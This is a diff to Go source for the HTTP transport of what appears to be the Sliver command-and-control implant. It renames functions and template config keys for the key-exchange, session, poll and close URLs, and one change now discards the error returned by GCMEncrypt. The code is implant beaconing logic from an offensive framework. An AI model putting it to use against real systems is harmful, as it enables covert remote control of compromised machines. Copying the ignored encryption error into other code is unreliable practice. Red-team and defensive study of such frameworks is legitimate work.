@@ -172,7 +172,7 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 }
 
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
-	uri := s.txtURL()
+	uri := s.keyExchangeURL()
 	nonce, encoder := encoders.RandomTxtEncoder()
 	s.NonceQueryArgument(uri, nonce)
 	otpCode := getOTPCode()
@@ -231,7 +231,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	payload := encoder.Encode(sessionInit)
 	reqBody := bytes.NewReader(payload) // Already RSA encrypted
 
-	uri := s.phtmlURL()
+	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
 	otpCode := getOTPCode()
 	s.OTPQueryArgument(uri, otpCode)
@@ -269,7 +269,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return nil, errors.New("no session")
 	}
-	uri := s.jsURL()
+	uri := s.pollURL()
 	nonce, encoder := encoders.RandomEncoder()
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
@@ -284,7 +284,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, err
 	}
 	if resp.StatusCode != 200 && resp.StatusCode != 201 {
-		return nil, errors.New("Non-200 response code")
+		return nil, errors.New("non-200 response code")
 	}
 	if resp.StatusCode == 403 {
 		// {{if .Config.Debug}}
@@ -312,9 +312,9 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	if s.SessionID == "" || s.SessionKey == nil {
 		return errors.New("no session")
 	}
-	reqData, err := GCMEncrypt(*s.SessionKey, data)
+	reqData, _ := GCMEncrypt(*s.SessionKey, data)
 
-	uri := s.phpURL()
+	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
 	s.NonceQueryArgument(uri, nonce)
 	reader := bytes.NewReader(encoder.Encode(reqData))
@@ -347,16 +347,16 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
-func (s *SliverHTTPClient) jsURL() *url.URL {
+func (s *SliverHTTPClient) pollURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
 	segments := []string{
-		// {{range .HTTPC2Config.JsPaths}}
+		// {{range .HTTPC2Config.PollPaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.JsFiles}}
+		// {{range .HTTPC2Config.PollFiles}}
 		"{{.}}",
 		// {{end}}
 	}
@@ -365,16 +365,16 @@ func (s *SliverHTTPClient) jsURL() *url.URL {
 	return curl
 }
 
-func (s *SliverHTTPClient) pngURL() *url.URL {
+func (s *SliverHTTPClient) closeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 
 	segments := []string{
-		// {{range .HTTPC2Config.PngPaths}}
+		// {{range .HTTPC2Config.ClosePaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.PngFiles}}
+		// {{range .HTTPC2Config.CloseFiles}}
 		"{{.}}",
 		// {{end}}
 	}
@@ -383,15 +383,15 @@ func (s *SliverHTTPClient) pngURL() *url.URL {
 	return curl
 }
 
-func (s *SliverHTTPClient) phpURL() *url.URL {
+func (s *SliverHTTPClient) sessionURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{
-		// {{range .HTTPC2Config.PhpPaths}}
+		// {{range .HTTPC2Config.SessionPaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.PhpFiles}}
+		// {{range .HTTPC2Config.SessionFiles}}
 		"{{.}}",
 		// {{end}}
 	}
@@ -399,21 +399,26 @@ func (s *SliverHTTPClient) phpURL() *url.URL {
 	return curl
 }
 
-func (s *SliverHTTPClient) phtmlURL() *url.URL {
-	curl := s.phpURL()
-	curl, _ = url.Parse(strings.Replace(curl.String(), ".php", ".phtml", 1))
+func (s *SliverHTTPClient) startSessionURL() *url.URL {
+	curl := s.sessionURL()
+	curl, _ = url.Parse(strings.Replace(
+		curl.String(),
+		".{{ .HTTPC2Config.SessionFileExt }}",
+		".{{ .HTTPC2Config.StartSessionFileExt }}",
+		1,
+	))
 	return curl
 }
 
-func (s *SliverHTTPClient) txtURL() *url.URL {
+func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{
-		// {{range .HTTPC2Config.TxtPaths}}
+		// {{range .HTTPC2Config.KeyExchangePaths}}
 		"{{.}}",
 		// {{end}}
 	}
 	filenames := []string{
-		// {{range .HTTPC2Config.TxtFiles}}
+		// {{range .HTTPC2Config.KeyExchangeFiles}}
 		"{{.}}",
 		// {{end}}
 	}
